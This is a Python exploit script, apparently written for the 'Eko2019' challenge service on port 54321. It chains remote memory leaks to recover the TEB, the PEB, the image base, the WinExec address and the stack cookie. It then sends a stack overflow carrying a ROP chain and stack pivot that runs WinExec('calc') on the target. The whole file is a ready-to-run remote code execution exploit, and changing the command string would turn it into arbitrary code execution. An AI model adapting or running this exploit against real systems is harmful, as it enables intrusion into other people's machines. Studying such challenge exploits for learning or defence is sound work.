import socket, sys, struct, argparse

# globals
# -----------------------------------------------------------------------------

SIZE_QUAD = struct.calcsize('Q')

# relative to image base
OFFS_DATA = 0xc000 # data section
OFFS_TEXT = 0x1000 # code section
OFFS_IDATA = 0x9000 # imports

# relative to text segment
OFFS_ORIG_RET = 0x55a # main+0x14a

# relative to idata segment
OFFS_WINEXEC = 0x10 # offset to WinExec

# relative to data segment
OFFS_COOKIE_XOR = 0x240 # xor key for cookie

# relative to leaked rsp
OFFS_CALC = 0x60 # offset to "calc\0" in buffer
OFFS_ROPCHAIN = 0x68 # offset of ropchain in buffer
OFFS_RET_ADDR = 0x298 # offset of return address on the stack to caller

# gadgets, reative to text segment
OFFS_MOV_RSP_R11_POP_RDX = 0x66a1
OFFS_POP_RBX = 0x6f9
OFFS_POP_RAX = 0x167
OFFS_POP_R12 = 0x2fbf
OFFS_POP_RSP = 0xfD7
OFFS_MOV_RCX_RAX_CALL_R12 = 0x5375
OFFS_MOV_QW_RBX_RAX_ADD_RSP_20_POP_RBX = 0x7302
OFFS_ADD_RSP_28 = 0x1d5
OFFS_ADD_RSP_50_POP_RBP = 0x75fd


# -----------------------------------------------------------------------------
def leak_teb():
    """get TEB via 'mov rax, gs:[0x30]' gadget"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 54321))
    s.send('Eko2019\x00\x10'+ '\x02\xFF\xFF\xFF\xFF\xFF\xFF')
    s.send(0x208*'\x65' + struct.pack('<Q', 0x30))
    leaked = s.recv(SIZE_QUAD)
    s.close()
    return struct.unpack('<Q', leaked)[0]

# -----------------------------------------------------------------------------
def leak_q(addr):
    """leak arbitrary qword from vulnerable process via
    'mov rax, [rcx] gadget"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 54321))
    s.send('Eko2019\x00\x10'+ '\x02\xFF\xFF\xFF\xFF\xFF\xFF')
    s.send(0x208*'\x4b'+struct.pack('<Q', addr))
    leaked = s.recv(SIZE_QUAD)
    s.close()
    return struct.unpack('<Q', leaked)[0]

# -----------------------------------------------------------------------------
def leak_cookie(addr_lo, addr_hi):
    """leak cookie from stack"""
    cookie = 0
    result = False
    i = 0
    for addr in xrange(addr_hi - SIZE_QUAD, addr_lo, -SIZE_QUAD):
        val = leak_q(addr)
        vprint('[+] %x: %x' % (addr, val), 2)
        if val == text_addr + OFFS_ORIG_RET:
            cookie = leak_q(addr - 3 * SIZE_QUAD)
            result = True
            break
    return (result, cookie)


# -----------------------------------------------------------------------------
def vprint(msg, level=1):
    """wrapper for print"""
    if ARGS.verbosity >= level:
        print(msg)
    return

# -----------------------------------------------------------------------------
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('--verbosity', type=int, default=1, help='verbosity level')
    ARGS = parser.parse_args()

    HOST = ARGS.host

    teb = leak_teb()
    vprint('[+] TEB: %x' % teb)

    stack_low = leak_q(teb+0x10)
    vprint('[+] Stack low: %x' % stack_low)

    stack_high = leak_q(teb+0x8)
    vprint('[+] Stack high: %x' % stack_high)

    peb = leak_q(teb+0x60)
    vprint('[+] PEB: %x' % peb)

    img_base = leak_q(peb+0x10)
    vprint('[+] ImgBase: %x' % img_base)

    data_addr = img_base + OFFS_DATA
    idata_addr = img_base + OFFS_IDATA
    text_addr = img_base + OFFS_TEXT

    winexec = leak_q(idata_addr + OFFS_WINEXEC)
    vprint('[+] WinExec: %x' % winexec)

    cookie_xor = leak_q(data_addr+OFFS_COOKIE_XOR)

    found, cookie = leak_cookie(stack_low, stack_high)
    if not found:
        vprint('[!] error: could not acquire cookie')
        sys.exit(0)

    vprint('[+] cookie: %x' % (cookie))
    rsp_addr = cookie ^ cookie_xor
    vprint('[+] RSP: %x' % rsp_addr)


    # build ropchain
    chain = (struct.pack('<Q', text_addr+OFFS_POP_R12) +
             struct.pack('<Q', text_addr+OFFS_POP_RAX) +
             struct.pack('<Q', text_addr+OFFS_POP_RAX) +
             struct.pack('<Q', rsp_addr+OFFS_CALC) +
             struct.pack('<Q', text_addr+OFFS_MOV_RCX_RAX_CALL_R12) +
             struct.pack('<Q', winexec) +

             struct.pack('<Q', text_addr+OFFS_ADD_RSP_28) +
             '\x3d' * 0x28 + 

             struct.pack('<Q', text_addr+OFFS_POP_RAX) +
             struct.pack('<Q', text_addr+OFFS_ORIG_RET)+
             struct.pack('<Q', text_addr+OFFS_POP_RBX) +
             struct.pack('<Q', rsp_addr+OFFS_RET_ADDR) +
             struct.pack('<Q', text_addr+OFFS_MOV_QW_RBX_RAX_ADD_RSP_20_POP_RBX) +
             '\x3d' * 0x28 + 
             struct.pack('<Q', text_addr+OFFS_ADD_RSP_50_POP_RBP) +
             '\x3d' * 0x58 +
             struct.pack('<Q', text_addr+OFFS_ADD_RSP_50_POP_RBP) +
             '\x3d' * 0x58 +
             struct.pack('<Q', text_addr+OFFS_ADD_RSP_50_POP_RBP) +
             '\x3d' * 0x58 +
             struct.pack('<Q', text_addr+OFFS_ADD_RSP_50_POP_RBP)      
             )

    pivot = (struct.pack('<Q', text_addr+OFFS_POP_RSP) +
             struct.pack('<Q', rsp_addr+OFFS_ROPCHAIN))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 54321))
    s.send('Eko2019\x00\x50' + '\x02\xFF\xFF\xFF\xFF\xFF\xFF')
    s.send(('calc\x00AAA' +
            chain +
            (0x220 - (len(chain) + SIZE_QUAD)) * '\x3d' +
            struct.pack('<Q', cookie)+
            2 * struct.pack('<Q', 0x4141414141414141) +
            pivot))

    s.close()
